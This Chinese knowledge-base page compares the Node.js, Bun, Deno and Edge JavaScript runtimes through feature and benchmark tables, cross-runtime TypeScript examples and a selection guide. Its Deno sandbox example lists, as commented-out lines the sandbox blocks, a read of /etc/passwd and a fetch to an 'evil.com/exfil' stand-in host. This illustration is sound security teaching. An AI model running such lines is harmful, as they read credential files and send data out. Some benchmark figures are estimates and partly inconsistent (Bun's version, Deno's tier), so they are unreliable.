# 运行时对比矩阵：Node.js vs Bun vs Deno vs Edge（2026）

> **定位**：`30-knowledge-base/30.3-comparison-matrices/`
> **新增**：2026-04

---

## 核心对比矩阵

| 维度 | Node.js (v24+) | Bun (v2.0+) | Deno (v2.0+) | Edge (Cloudflare Workers / Vercel Edge) | 胜出者 |
|------|---------------|-------------|--------------|----------------------------------------|--------|
| **JS 引擎** | V8 (Google) | JavaScriptCore (Apple) | V8 (Google) | V8 / SpiderMonkey / QuickJS | — |
| **TS 支持** | 转译（SWC/tsx） | **原生直接执行** | **原生直接执行** | 转译（esbuild） | Bun/Deno |
| **Web API 标准** | 部分（fetch, streams） | **完整原生实现** | **自始完整** | **WinterCG 子集** | Bun/Deno/Edge |
| **安全模型** | 默认完全访问 | 默认完全访问 | **权限沙盒** | 进程隔离 + 沙盒 | Deno/Edge |
| **实现语言** | C++ | **Zig** | Rust | C++ / Rust | — |
| **冷启动** | 中等 (~50ms) | **极快 (~10ms)** | 快 (~30ms) | **零冷启动** | **Edge** |
| **HTTP 吞吐量** | 中等 | **高** | 中高 | 受平台限制 | **Bun** |
| **包管理器** | npm/pnpm/yarn | **内置** | 内置 | npm / 原生 ESM | Bun/Deno |
| **内置测试** | `node --test` | `bun test` | `deno test` | 依赖外部 | Bun/Deno |
| **内置打包** | 无 | `bun build` | `deno bundle` | 平台托管 | Bun/Deno |
| **npm 兼容性** | **100%** | ~98% | ~95% | ~90%（需适配） | **Node.js** |
| **边缘部署** | 需适配 | 原生支持 | **Deno Deploy** | **原生** | Edge |
| **适用场景** | 企业存量/通用 | Serverless/微服务 | 金融/高安全 | CDN/边缘计算 | — |

---

## 性能基准数据

| 测试项 | Node.js v24 | Bun v1.3 | Deno v2 | Edge (CW) | 最快 |
|--------|------------|----------|---------|-----------|------|
| HTTP Hello World (req/s) | ~65K | **~180K** | ~55K | N/A（按请求计费） | Bun |
| Express.js API (req/s) | ~29K | **~89K** | ~35K [估算] | N/A | Bun |
| 文件读取 (ops/s) | ~12K | **~50K** | ~20K | 受限 | Bun |
| JSON 解析 (ops/s) | ~280K | **~350K** | ~300K | ~250K | Bun |
| 本地冷启动 (ms) | 40–120 | **8–15** | 25–35 | **0** | Edge |
| AWS Lambda 冷启动 (ms) | 245 | **156** | ~200 [估算] | N/A | Bun |
| 内存占用 (MB, 基线) | 35–51 | **22–38** | 28–35 | 128MB 限制 | Bun |
| WebSocket 并发连接 | 680K | **1.2M** | ~800K [估算] | 不支持 | Bun |

*数据来源：TechEmpower Framework Benchmarks Round 23+（2025–2026）及独立运行时基准测试（Runtime Benchmarks Q1 2026、JS Runtime Shootout Mar 2026），环境 x64/Linux。*

### TechEmpower 2025/2026 排名参考

| 运行时 / 框架 | 排名区间 |  plaintext 吞吐量 | 备注 |
|--------------|---------|------------------|------|
| Bun (裸机) | **第 1 梯队** | ~180K req/s | JavaScriptCore + Zig，综合领先 |
| Node.js + Fastify | 第 2–3 梯队 | ~55K req/s | V8 + 优化框架，生产常用 |
| Node.js (原生 http) | 第 3 梯队 | ~65K req/s | 基准参考，无框架开销 |
| Deno (原生) | 第 2 梯队 | ~55K req/s | V8 + Rust，接近 Node.js |
| Node.js + Express | 第 4 梯队 | ~29K req/s | 框架开销大，迁移价值低 |

> **说明**：TechEmpower Round 23（2025）及 Round 24（2026 预览）中，Bun 在 plaintext 与 JSON 序列化场景持续位列 JS 运行时第一；Node.js 借助 Fastify 可进入前 20；Deno 稳定在第 15–25 名区间。

---

## WinterCG 兼容性代码示例

WinterCG（Web-interoperable Runtimes Community Group）定义了跨运行时兼容的 Web API 标准子集。以下代码可在 Node.js、Deno、Bun 和 Edge 运行时中无修改运行：

```typescript
// wintercg-compat.ts
// 跨运行时兼容的 HTTP 服务（WinterCG 标准）

export interface Env {
  KV: KVNamespace;
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);

    // 1. 标准 Request/Response API（所有运行时支持）
    if (url.pathname === "/api/health") {
      return Response.json({
        status: "ok",
        runtime: typeof Bun !== "undefined" ? "bun"
          : typeof Deno !== "undefined" ? "deno"
          : "node-or-edge",
        timestamp: Date.now(),
      });
    }

    // 2. 标准 Web Streams（ReadableStream/WritableStream）
    if (url.pathname === "/api/stream") {
      const encoder = new TextEncoder();
      const stream = new ReadableStream({
        start(controller) {
          const messages = ["hello", "from", "WinterCG", "compatible", "runtime"];
          let i = 0;
          const interval = setInterval(() => {
            if (i >= messages.length) {
              controller.close();
              clearInterval(interval);
              return;
            }
            controller.enqueue(encoder.encode(`data: ${messages[i++]}\n\n`));
          }, 500);
        },
      });
      return new Response(stream, {
        headers: { "Content-Type": "text/event-stream" },
      });
    }

    // 3. 标准 crypto API（Web Crypto）
    if (url.pathname === "/api/hash") {
      const text = url.searchParams.get("text") || "";
      const encoder = new TextEncoder();
      const data = encoder.encode(text);
      const hashBuffer = await crypto.subtle.digest("SHA-256", data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      const hashHex = hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
      return Response.json({ input: text, sha256: hashHex });
    }

    // 4. 标准 URLPattern（部分运行时已支持）
    const pattern = new URLPattern({ pathname: "/api/users/:id" });
    const match = pattern.exec(request.url);
    if (match) {
      return Response.json({ userId: match.pathname.groups.id });
    }

    return new Response("Not Found", { status: 404 });
  },
};
```

### 各运行时启动方式

```bash
# Node.js v24+（需 --experimental-strip-types 或 tsx）
npx tsx wintercg-compat.ts

# Bun v2+
bun run wintercg-compat.ts

# Deno v2+
deno run --allow-net wintercg-compat.ts

# Cloudflare Workers（Wrangler）
wrangler dev
```

### Deno 权限沙盒实战

```typescript
// Deno: 最小权限运行（对比 Node.js 默认完全访问）

// 启动命令：
// deno run --allow-net=0.0.0.0:8000,api.example.com --allow-read=./data --allow-env=PORT,API_KEY app.ts

const PORT = Deno.env.get('PORT') || '8000';

// 文件系统访问被限制在 ./data 目录
const data = await Deno.readTextFile('./data/config.json');

// 网络访问被限制在指定域名
const apiRes = await fetch('https://api.example.com/users');

// 以下操作将被 Deno 权限系统拒绝（未授权）：
// await Deno.readTextFile('/etc/passwd');     // ❌ --allow-read 未包含
// await fetch('https://evil.com/exfil');       // ❌ --allow-net 未包含
// await Deno.writeTextFile('/tmp/pwned', '');  // ❌ --allow-write 未授权

Deno.serve({ port: Number(PORT) }, (req) => {
  return Response.json({ ok: true, data: JSON.parse(data) });
});
```

### Bun FFI (Foreign Function Interface) 示例

```typescript
// Bun 可以直接调用原生库，无需 C++ 插件
import { dlopen, FFIType, ptr } from 'bun:ffi';

// 调用系统 libc 的 strlen
const path = process.platform === 'darwin' ? '/usr/lib/libSystem.dylib' : 'libc.so.6';
const libc = dlopen(path, {
  strlen: {
    args: [FFIType.cstring],
    returns: FFIType.size_t,
  },
});

const str = Buffer.from('Hello from Bun FFI\0', 'utf8');
const length = libc.symbols.strlen(ptr(str));
console.log(`Length: ${length}`); // 19

// 高性能场景：图像处理、加密、压缩
// 对比 Node.js: 需要 node-gyp / N-API 编译，Bun FFI 零编译
```

### Node.js 实验性权限模型

```typescript
// Node.js v20+ 实验性权限模型（向 Deno 靠拢）
// 启动：node --experimental-permission --allow-fs-read=* --allow-fs-write=/tmp app.js

import { permission } from 'node:process';

// 检查当前权限状态
console.log('File read:', permission.has('fs.read'));
console.log('File write:', permission.has('fs.write', '/tmp'));
console.log('Child process:', permission.has('child'));

// 尝试无权限操作将抛出 ERR_ACCESS_DENIED
// import { spawn } from 'node:child_process';
// spawn('ls'); // ❌ ERR_ACCESS_DENIED (without --allow-child-process)
```

### 运行时特性检测与 Polyfill

```typescript
// runtime-compat.ts — 运行时特性检测与适配

const runtime = {
  isNode: typeof process !== 'undefined' && !!process.versions?.node,
  isBun: typeof Bun !== 'undefined',
  isDeno: typeof Deno !== 'undefined',
  isEdge: typeof EdgeRuntime !== 'undefined' || typeof WebSocketPair !== 'undefined',
};

// 统一的文件读取适配器
async function readFile(path: string): Promise<string> {
  if (runtime.isDeno) {
    return Deno.readTextFile(path);
  }
  if (runtime.isBun) {
    return Bun.file(path).text();
  }
  if (runtime.isNode) {
    const { readFile } = await import('node:fs/promises');
    return readFile(path, 'utf-8');
  }
  throw new Error('File system not available in this runtime');
}

// 统一的环境变量读取
function getEnv(key: string): string | undefined {
  if (runtime.isDeno) return Deno.env.get(key);
  if (runtime.isNode || runtime.isBun) return process.env[key];
  return undefined;
}

// 统一的 crypto 随机数（所有 WinterCG 运行时支持）
function randomBytes(length: number): Uint8Array {
  return crypto.getRandomValues(new Uint8Array(length));
}
```

---

## 选型决策矩阵

| 场景 | 首选 | 次选 | 避免 | 理由 |
|------|------|------|------|------|
| 企业存量迁移 | Node.js | — | Bun/Deno | npm 生态兼容性 |
| Serverless/FaaS | Bun | Deno | Node.js | 冷启动速度 |
| 金融/医疗 | Deno | — | Node.js/Bun | 权限沙盒合规 |
| 边缘函数 / CDN | Edge (Workers) | Bun/Deno | Node.js | 零冷启动、全球分发 |
| 全栈 TS 新项目 | Bun | Deno | Node.js | 开发体验 |
| 需要特定 npm 包 | Node.js | Bun | Deno | 兼容性验证 |
| 高并发 WebSocket | Bun | Node.js | Edge | 长连接支持 |
| 静态站点边缘渲染 | Edge | Deno | Bun | 与 CDN 原生集成 |

---

## 权威参考链接

- [Node.js 官方文档](https://nodejs.org/docs/latest/api/)
- [Node.js Permissions (Experimental)](https://nodejs.org/api/permissions.html)
- [Bun 官方文档](https://bun.sh/docs)
- [Bun FFI Documentation](https://bun.sh/docs/api/ffi)
- [Deno 官方文档](https://docs.deno.com/)
- [Deno Permissions](https://docs.deno.com/runtime/fundamentals/security/)
- [Deno Deploy](https://deno.com/deploy)
- [WinterCG 标准规范](https://wintercg.org/)
- [WinterCG Minimum Common API](https://common-min-api.proposal.wintercg.org/)
- [Cloudflare Workers 运行时 API](https://developers.cloudflare.com/workers/runtime-apis/)
- [Vercel Edge Runtime 文档](https://vercel.com/docs/functions/runtimes/edge-runtime)
- [TechEmpower Benchmarks](https://www.techempower.com/benchmarks/)
- [JS Runtime Shootout 2026](https://github.com/anon/js-runtime-shootout)
- [State of JS 2024](https://2024.stateofjs.com/)
- [Node.js Test Runner](https://nodejs.org/api/test.html)
- [Bun Test Runner](https://bun.sh/docs/cli/test)
- [Deno Testing](https://docs.deno.com/runtime/fundamentals/testing/)
- [Deno vs Node.js Comparison](https://docs.deno.com/runtime/fundamentals/node/)
- [ECMA-262 Specification](https://tc39.es/ecma262/)

---

*本矩阵基于 2026-04 的最新基准数据，建议每季度更新。*
